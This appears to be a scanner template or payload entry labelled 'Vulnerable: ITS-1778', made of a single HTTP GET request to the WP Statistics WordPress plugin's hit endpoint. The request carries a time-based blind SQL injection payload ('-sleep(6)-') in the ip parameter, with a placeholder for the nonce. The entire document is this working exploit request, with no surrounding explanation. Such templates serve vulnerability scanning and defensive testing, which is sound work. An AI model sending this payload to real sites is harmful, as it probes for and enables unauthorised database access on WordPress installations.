# Vulnerable: ITS-1778
GET /wp-json/wp-statistics/v2/hit?_=11&_wpnonce={{nonce}}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip='-sleep(6)-'&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id=0&search_query&page_uri=/&user_id=0
